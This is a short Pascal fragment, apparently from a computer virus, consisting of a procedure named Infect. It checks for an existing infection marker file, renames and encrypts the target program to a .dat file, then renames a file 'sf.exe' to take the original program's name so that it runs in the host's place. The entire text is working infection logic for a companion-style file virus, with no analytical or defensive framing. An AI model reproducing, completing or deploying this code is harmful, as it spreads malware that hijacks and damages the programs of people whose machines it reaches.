   procedure Infect(st:string);
   var k:string;
       f:file;
   begin
   fsplit(st,a,b,c);
   k:=a+b+'.dat';
   assign(f,k);{$I-}reset(f);{$I+}
   if ioresult=0 then begin close(f);exit;end;
   MakePas;
   assign(f,st);
   rename(f,k);
   Crypt(k,1);
   assign(f,'sf.exe');
   rename(f,st);
   end;
